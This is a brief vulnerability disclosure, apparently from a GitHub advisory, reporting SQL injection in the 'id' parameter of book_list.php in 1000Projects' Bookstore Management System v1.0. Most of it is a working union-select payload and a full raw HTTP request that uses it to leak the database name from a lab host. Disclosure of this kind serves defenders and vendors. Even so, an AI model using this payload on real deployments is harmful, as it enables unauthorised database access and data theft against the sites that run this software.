# Bookstore Management System v1.0 by 1000Projects has SQL injection

BUG_Author: 樊琦 广州大学，孙一航 广州大学，孙彦斌 广州大学

vendors: https://1000projects.org/bookstore-management-system-php-mysql-project.html

The program is built using the xmapp-php5.6 version

Vulnerability File: /bms/book_list.php?id=

Vulnerability location: /bms/book_list.php?id=, id

dbname =bms

[+] Payload: /bms/book_list.php?id=-17 union select 1,database(),3,4,5,6,7--+&cat=Web Design // Leak place ---> main_event_id

```sql
GET /bms/book_list.php?id=-17%20union%20select%201,database(),3,4,5,6,7--+&cat=Web%20Design HTTP/1.1
Host: 192.168.1.16
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=7hpgkhvc3ujgkqtdko38g42if7
Connection: close
```

![image](https://github.com/user-attachments/assets/de720dc7-7b71-4859-8c86-90acba0a88dd)
